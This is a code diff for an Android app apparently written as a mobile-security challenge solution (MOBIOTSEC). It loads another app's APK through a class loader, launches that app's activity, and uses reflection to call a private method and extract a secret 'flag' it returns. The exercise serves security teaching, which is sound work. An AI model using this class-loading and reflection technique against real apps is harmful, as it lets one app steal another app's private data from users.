@@ -2,13 +2,17 @@ package com.example.maliciousapp
 
 import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.content.pm.PackageManager.ApplicationInfoFlags
 import android.os.Bundle
 import android.util.Log
 
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
-import com.example.victimapp.FlagContainer
+import dalvik.system.PathClassLoader
+
+import java.io.Serializable
 
 class MainActivity : AppCompatActivity() {
     val TAG = "MOBIOTSEC"
@@ -20,6 +24,25 @@ class MainActivity : AppCompatActivity() {
 
     override fun onStart() {
         super.onStart()
+        getFlag()
+    }
+
+    @Suppress("UNCHECKED_CAST")
+    private fun getFlag() {
+        val apk = getPackageManager()
+            .getApplicationInfo(
+                "com.example.victimapp",
+                ApplicationInfoFlags.of(
+                    PackageManager
+                        .GET_META_DATA
+                        .toLong()
+                )
+            )
+            .sourceDir
+        val pathClassLoader = PathClassLoader(apk, classLoader)
+        val containerClass = pathClassLoader
+            .loadClass("com.example.victimapp.FlagContainer")
+            as Class<Serializable>
 
         val intent = Intent().apply {
             component = ComponentName(
@@ -28,19 +51,19 @@ class MainActivity : AppCompatActivity() {
             )
         }
         val contract = ActivityResultContracts.StartActivityForResult()
-        registerForActivityResult(contract) { result ->
-            val container = result
-                .data
-                ?.getSerializableExtra("flag", FlagContainer::class.java)
+        registerForActivityResult(contract) { it.data?.let { extras ->
+            extras.setExtrasClassLoader(pathClassLoader)
+            val container = extras
+                .getSerializableExtra("flag", containerClass)
 
             container?.let {
-                val flag = it::class
-                    .java
+                val flag = it
+                    .javaClass
                     .getDeclaredMethod("getFlag")
                     .apply { setAccessible(true) }
                     .invoke(it)
                 Log.d(TAG, "The flag is $flag")
             }
-        }.launch(intent)
+        }}.launch(intent)
     }
 }
